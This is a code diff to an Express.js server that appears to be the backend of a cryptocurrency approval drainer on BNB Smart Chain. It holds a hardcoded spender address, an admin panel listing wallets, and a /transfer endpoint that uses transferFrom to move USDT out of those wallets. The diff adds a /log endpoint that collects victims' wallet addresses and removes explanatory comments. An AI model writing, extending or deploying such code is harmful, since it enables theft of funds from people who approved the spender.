@@ -13,7 +13,6 @@ app.use(express.static(path.join(__dirname, "public")));
 
 const PRIVATE_KEY = process.env.PRIVATE_KEY;
 
-// ✅ BSC RPC provider with chain info to avoid ENS errors
 const provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/", {
   name: "binance",
   chainId: 56,
@@ -27,16 +26,14 @@ const USDT_ABI = [
   "function transferFrom(address from, address to, uint amount) returns (bool)"
 ];
 
-const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT BSC
+const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const SPENDER_ADDRESS = "0x61f6f18fbc3ea4060b5aac3894094d1b3322c63b";
 const contract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, wallet);
 
-// ✅ Route: Admin Panel on root "/"
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "admin.html"));
 });
 
-// ✅ API: Load dynamic wallet list from wallets.json
 app.get("/wallets", async (req, res) => {
   try {
     const walletList = JSON.parse(fs.readFileSync("wallets.json"));
@@ -57,7 +54,6 @@ app.get("/wallets", async (req, res) => {
   }
 });
 
-// ✅ API: Transfer funds using transferFrom
 app.post("/transfer", async (req, res) => {
   try {
     const { fromWallet, toWallet, amount } = req.body;
@@ -68,6 +64,25 @@ app.post("/transfer", async (req, res) => {
     console.error("❌ Transfer Error:", err);
     res.status(500).json({ success: false, error: err.message });
   }
+});
+
+app.post("/log", async (req, res) => {
+  const { wallet } = req.body;
+  if (!wallet || !wallet.startsWith("0x")) return res.status(400).json({ error: "Invalid wallet" });
+
+  let walletList = [];
+  try {
+    walletList = JSON.parse(fs.readFileSync("wallets.json"));
+  } catch (e) {
+    console.warn("wallets.json not found, creating new.");
+  }
+
+  if (!walletList.includes(wallet)) {
+    walletList.push(wallet);
+    fs.writeFileSync("wallets.json", JSON.stringify(walletList, null, 2));
+  }
+
+  res.json({ success: true });
 });
 
 const PORT = process.env.PORT || 3000;
